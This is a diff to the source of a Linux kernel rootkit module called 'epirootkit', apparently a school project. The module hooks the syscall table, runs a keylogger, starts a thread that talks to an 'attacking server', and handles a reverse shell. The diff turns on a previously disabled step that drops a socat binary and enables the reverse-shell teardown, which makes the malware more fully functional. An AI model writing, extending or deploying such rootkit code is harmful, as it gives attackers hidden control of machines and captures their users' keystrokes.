@@ -7,7 +7,8 @@
 #include "epirootkit.h"
 
 struct task_struct *network_thread = NULL;
-bool thread_exited = false;
+bool thread_exited = true;
+bool restart_on_error = true;
 
 char *ip = SERVER_IP;
 int port = SERVER_PORT;
@@ -27,29 +28,25 @@ MODULE_PARM_DESC(message, "Message to send to the attacking server");
  * @return Returns 0 (SUCCESS) on successful initialization, or a negative
  * error code if the kernel thread fails to start.
  */
-static int __init epirootkit_init(void)
-{
+static int __init epirootkit_init(void){
 	DBG_MSG("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");
-
+	
 	// Initalize hooks for the syscall table
 	int err;
 	err = fh_install_hooks(hooks, hook_array_size);
-    if (err)
-    {
-        printk(KERN_ERR "my_module: failed to install hooks: %d\n", err);
-        return err;
-    }
+	if (err)
+	{
+		printk(KERN_ERR "my_module: failed to install hooks: %d\n", err);
+		return err;
+	}
 
 	// Init structure for exec_code_stds
-	// code: return code of the command
-	// std_out: output of the command
-	// std_err: error output of the command
 	if(init_exec_result() != SUCCESS) {
 		ERR_MSG("epirootkit: epirootkit_init: memory allocation failed\n");
 		return -ENOMEM;
 	}
 
-	if(0 && drop_socat_binaire() != SUCCESS) {
+	if(drop_socat_binaire() != SUCCESS) {
 		ERR_MSG("epirootkit: epirootkit_init: failed to drop socat binary\n");
 		return -FAILURE;
 	}
@@ -57,9 +54,11 @@ static int __init epirootkit_init(void)
 	// launch_reverse_shell();
 
 	// Start a kernel thread that will handle network communication
+	thread_exited = false;
 	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
 	if (IS_ERR(network_thread)) {
 		ERR_MSG("epirootkit: epirootkit_init: failed to start thread\n");
+		thread_exited = true;
 		return PTR_ERR(network_thread);
 	}
 
@@ -72,7 +71,7 @@ static int __init epirootkit_init(void)
  * This function is executed during the module's exit phase. 
  */
 static void __exit epirootkit_exit(void){
-	// stop_reverse_shell();
+	stop_reverse_shell();
 
 	// stop keylogger
 	epikeylog_exit();
@@ -82,6 +81,8 @@ static void __exit epirootkit_exit(void){
 	if (network_thread) {
 		if (!thread_exited)
 			kthread_stop(network_thread);
+		thread_exited = true;
+		network_thread = NULL;
 		DBG_MSG("epirootkit: close_thread: thread stopped\n");
 	}
 
